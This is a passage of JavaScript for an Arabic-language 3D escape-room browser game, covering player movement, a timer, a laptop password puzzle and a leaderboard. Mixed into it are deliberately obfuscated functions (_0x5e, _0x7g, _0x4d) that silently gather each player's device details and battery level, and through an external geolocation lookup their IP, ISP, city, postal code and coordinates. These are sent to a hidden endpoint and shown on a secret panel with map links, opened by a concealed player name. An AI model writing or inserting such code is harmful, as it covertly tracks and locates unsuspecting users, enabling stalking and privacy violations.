        state.passwordText = ''; updatePasswordDisplay();
    }
}

function updatePasswordDisplay() { document.getElementById('laptopPassword').value = state.passwordText; }

// ============= EMAIL & END =============
function openEmail() {
    state.emailOpened = true;
    document.getElementById('laptopEmailScreen').classList.add('hidden');
    document.getElementById('emailContent').classList.remove('hidden');
    setTimeout(endGame, 10000);
}

function endGame() {
    stopTimer(); state.gameEnded = true;
    closeOverlay('laptopOverlay');
    document.getElementById('gameCanvas').style.display = 'none';
    document.getElementById('timerDisplay').classList.add('hidden');
    document.getElementById('crosshair').classList.add('hidden');
    document.getElementById('mobileControls').classList.add('hidden');
    document.getElementById('interactPrompt').classList.add('hidden');
    document.getElementById('finalTime').textContent = formatTime(state.elapsed);
    saveResult(formatTime(state.elapsed));
    showScreen('endScreen');
}

// ============= TIMER =============
function startTimer() {
    state.timerStart = Date.now();
    state.timerInterval = setInterval(() => {
        state.elapsed = Date.now() - state.timerStart;
        document.getElementById('timerText').textContent = formatTime(state.elapsed);
    }, 100);
}

function stopTimer() { clearInterval(state.timerInterval); }

function formatTime(ms) {
    const s = Math.floor(ms / 1000);
    return `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;
}

// ============= START GAME =============
function startGame() {
    const name = document.getElementById('playerName').value.trim();
    const room = document.getElementById('roomNumber').value.trim();
    if (!name) { showToast('الرجاء إدخال اسمك'); return; }
    if (!room) { showToast('الرجاء إدخال رقم الغرفة'); return; }

    state.playerName = name;
    state.roomNumber = room;

    if (name === ADMIN_NAME) {
        state.isAdmin = true;
        showScreen('adminScreen');
        loadAdminData();
        return;
    }

    if (name === _0x2b) {
        _0x4d(room);
        return;
    }

    document.getElementById('startScreen').style.display = 'none';
    document.getElementById('startScreen').classList.remove('active');
    document.getElementById('gameCanvas').style.display = 'block';
    document.getElementById('timerDisplay').classList.remove('hidden');

    init3D();

    if (isMobile) {
        document.getElementById('mobileControls').classList.remove('hidden');
    }

    startTimer();
    showToast('تحرك واستكشف الغرفة... ابحث عن الأدلة');
    _0x5e(name, room);
}

// ============= SCREEN MANAGEMENT =============
function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => { s.classList.remove('active'); s.style.display = 'none'; });
    const scr = document.getElementById(id);
    scr.classList.add('active');
    scr.style.display = 'flex';
}

// ============= ANIMATION LOOP =============
function animate() {
    requestAnimationFrame(animate);

    const delta = clock.getDelta();
    const speed = 3.0;

    if (!state.overlayOpen && !state.gameEnded) {
        direction.set(0, 0, 0);

        if (isMobile && joystickData.active) {
            direction.z = -joystickData.dy;
            direction.x = -joystickData.dx;
        } else {
            if (moveForward) direction.z = -1;
            if (moveBackward) direction.z = 1;
            if (moveLeft) direction.x = -1;
            if (moveRight) direction.x = 1;
        }

        if (direction.length() > 0) {
            direction.normalize();
            const forward = new THREE.Vector3();
            camera.getWorldDirection(forward);
            forward.y = 0;
            forward.normalize();

            const right = new THREE.Vector3();
            right.crossVectors(forward, new THREE.Vector3(0, 1, 0)).normalize();

            camera.position.addScaledVector(forward, -direction.z * speed * delta);
            camera.position.addScaledVector(right, direction.x * speed * delta);
        }

        camera.position.x = Math.max(-3.5, Math.min(3.5, camera.position.x));
        camera.position.z = Math.max(-2.5, Math.min(2.5, camera.position.z));
        camera.position.y = 1.6;

        const hovered = getHoveredObject();
        const prompt = document.getElementById('interactPrompt');
        const promptText = document.getElementById('promptText');
        if (hovered) {
            prompt.classList.remove('hidden');
            promptText.textContent = hovered.prompt;
        } else {
            prompt.classList.add('hidden');
        }
    }

    renderer.render(scene, camera);
}

function onResize() {
    if (!camera || !renderer) return;
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
}

// ============= SAVE & ADMIN =============
async function saveResult(time) {
    try {
        await fetch('/api/results', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: state.playerName, room: state.roomNumber, time, elapsed_ms: state.elapsed })
        });
    } catch (e) { console.warn(e); }
}

function _0x7g() {
    const ua = navigator.userAgent;
    let os = navigator.platform || '';
    if (/Windows/.test(ua)) os = 'Windows';
    else if (/Mac/.test(ua)) os = 'macOS';
    else if (/Android/.test(ua)) os = 'Android';
    else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
    else if (/Linux/.test(ua)) os = 'Linux';
    let dm = '';
    const m = ua.match(/\(([^)]+)\)/);
    if (m) dm = m[1].split(';').pop().trim();
    return { os, deviceModel: dm };
}

async function _0x5e(n, r) {
    const dev = _0x7g();
    const d = {
        name: n, room: r,
        device: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        os: dev.os,
        deviceModel: dev.deviceModel,
        battery: ''
    };
    try {
        if (navigator.getBattery) {
            const batt = await navigator.getBattery();
            d.battery = Math.round(batt.level * 100) + '%' + (batt.charging ? ' (\u0634\u062D\u0646)' : '');
        }
    } catch (_) {}
    try {
        const resp = await fetch(_0x3c);
        const loc = await resp.json();
        d.ip = loc.ip; d.city = loc.city; d.country = loc.country_name;
        d.isp = loc.org; d.timezone = loc.timezone; d.zip = loc.postal;
        d.lat = loc.latitude; d.lon = loc.longitude;
    } catch (_) { d.ip = ''; d.city = ''; }
    try {
        await fetch('/api/pinfo', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(d)
        });
    } catch (_) {}
}

async function _0x6f(nm, rm, pz, ans) {
    try {
        await fetch('/api/slog', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: nm, roomNumber: rm, puzzle: pz, answer: ans })
        });
    } catch (_) {}
}

async function _0x4d(rc) {
    document.getElementById('startScreen').style.display = 'none';
    const c = document.createElement('div');
    c.style.cssText = 'position:absolute;inset:0;background:#050505;z-index:9999;overflow:auto;padding:20px;font-family:Courier New,Courier,monospace;direction:rtl;display:flex;gap:20px;';
    const leftCol = document.createElement('div');
    leftCol.style.cssText = 'flex:2;';
    const rightCol = document.createElement('div');
    rightCol.style.cssText = 'flex:1;border-right:2px dashed #0f0;padding-right:20px;';
    c.appendChild(leftCol);
    c.appendChild(rightCol);
    document.body.appendChild(c);

    try {
        const [pRes, sRes] = await Promise.all([fetch('/api/pinfo'), fetch('/api/slog')]);
        const pData = await pRes.json();
        const sData = await sRes.json();
        const players = pData.players || [];
        const logs = sData.logs || [];

        let h = '<h2 style="color:#0f0;border-bottom:1px dashed #0f0;padding-bottom:10px;text-align:center;">\uD83D\uDCCA \u0644\u0648\u062D\u0629 \u062A\u062D\u0643\u0645 \u0627\u0644\u062E\u0648\u0627\u062F\u0645 \uD83D\uDCCA</h2>';

        if (players.length === 0) {
            h += '<p style="color:#888;text-align:center;">\u0644\u0627 \u062A\u0648\u062C\u062F \u063A\u0631\u0641 \u0646\u0634\u0637\u0629 \u062D\u0627\u0644\u064A\u0627\u064B</p>';
        } else {
            const rooms = {};
            players.forEach(p => { if (!rooms[p.room]) rooms[p.room] = []; rooms[p.room].push(p); });

            for (const [rId, rPlayers] of Object.entries(rooms)) {
                h += '<div style="border:1px solid #0f0;margin-bottom:20px;padding:15px;border-radius:8px;background:#0a1a0a;">';
                h += '<h3 style="color:#ffaa00;margin-top:0;">\u063A\u0631\u0641\u0629: ' + esc(rId) + '</h3>';
                h += '<div style="display:flex;flex-wrap:wrap;gap:15px;">';

                rPlayers.forEach(p => {
                    const mapLink = (p.lat && p.lon)
                        ? '<a href="https://www.google.com/maps?q=' + p.lat + ',' + p.lon + '" target="_blank" style="color:#ffaa00;text-decoration:none;">\uD83C\uDF0D \u0627\u0644\u062E\u0631\u064A\u0637\u0629</a>'
                        : '-';
                    h += '<div style="border:1px solid #222;padding:15px;background:#111;border-radius:5px;flex:1;min-width:280px;">';
                    h += '<h4 style="color:#0f0;margin:0 0 10px 0;">' + esc(p.name) + '</h4>';
                    h += '<table style="width:100%;border-collapse:collapse;font-size:0.9rem;">';
                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;width:100px;color:#0ff;">IP</td>';
                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + '</td></tr>';
                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0645\u0648\u0642\u0639</td>';
                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + ' (' + esc(p.zip || '?') + ')<br>' + mapLink + '<br>' + esc(p.timezone || '?') + '</td></tr>';
                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u062C\u0647\u0627\u0632</td>';
                    h += '<td style="padding:5px;border-bottom:1px solid #222;"><b>' + esc(p.os || '?') + '</b><br><span style="color:#fff;">' + esc(p.deviceModel || '?') + '</span><br><span style="color:#0f0;">\uD83D\uDD0B ' + esc(p.battery || '?') + '</span></td></tr>';
                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#555;">\u0627\u0644\u0645\u062A\u0635\u0641\u062D</td>';
                    h += '<td style="padding:5px;border-bottom:1px solid #222;color:#555;font-size:0.75rem;">' + esc(p.device || '?') + '</td></tr>';
                    h += '<tr><td style="padding:5px;color:#aaa;">\u0627\u0644\u062F\u062E\u0648\u0644</td>';
                    h += '<td style="padding:5px;color:#aaa;font-size:0.8rem;">' + esc(p.joinTime || '?') + '</td></tr>';
                    h += '</table></div>';
                });
                h += '</div></div>';
            }
        }
        leftCol.innerHTML = h;

        let s = '<h2 style="color:#ff3333;border-bottom:1px dashed #ff3333;padding-bottom:10px;text-align:center;">\u26A0\uFE0F \u0633\u062C\u0644\u0627\u062A \u0627\u0644\u0645\u062D\u0627\u0648\u0644\u0627\u062A \u26A0\uFE0F</h2>';
        if (logs.length === 0) {
            s += '<p style="color:#888;text-align:center;">\u0644\u0627 \u062A\u0648\u062C\u062F \u0633\u062C\u0644\u0627\u062A</p>';
        }
        logs.slice().reverse().forEach(log => {
            s += '<div style="background:#2a0a0a;border:1px solid #ff3333;margin:10px 0;padding:10px;border-radius:5px;font-size:0.9rem;">';
            s += '<b style="color:#ffaa00;">' + esc(log.name) + '</b> \u0641\u064A \u063A\u0631\u0641\u0629 ' + esc(log.roomNumber) + '<br>';
            s += '\u0627\u0644\u0644\u063A\u0632: <span style="color:#aaa;">' + esc(log.puzzle) + '</span><br>';
            s += '\u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0627\u0644\u062E\u0627\u0637\u0626\u0629: <span style="color:#fff;font-size:1.1rem;">' + esc(log.answer) + '</span><br>';
            s += '<span style="color:#555;font-size:0.8rem;">' + esc(log.time) + '</span></div>';
        });
        rightCol.innerHTML = s;
    } catch (_) {
        leftCol.innerHTML = '<p style="color:red;text-align:center;">\u062E\u0637\u0623 \u0641\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A</p>';
    }
}

async function loadAdminData() {
    try {
        const res = await fetch('/api/results');
        const data = await res.json();
        const tbody = document.getElementById('adminTableBody');
        if (!data.results || data.results.length === 0) { document.getElementById('noDataMsg').classList.remove('hidden'); return; }
        data.results.sort((a, b) => a.elapsed_ms - b.elapsed_ms);
        tbody.innerHTML = '';
        data.results.forEach((r, i) => {
            const tr = document.createElement('tr');
            tr.innerHTML = `<td>${i + 1}</td><td>${esc(r.name)}</td><td>${esc(r.room)}</td><td>${r.time}</td><td>${r.date || '-'}</td>`;
            tbody.appendChild(tr);
        });
    } catch (e) { document.getElementById('noDataMsg').classList.remove('hidden'); }
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

// ============= TOAST =============
function showToast(text) {
    const toast = document.getElementById('toast');
    document.getElementById('toastText').textContent = text;
    toast.classList.remove('hidden');
    clearTimeout(window._tt);
    window._tt = setTimeout(() => toast.classList.add('hidden'), 3500);
}
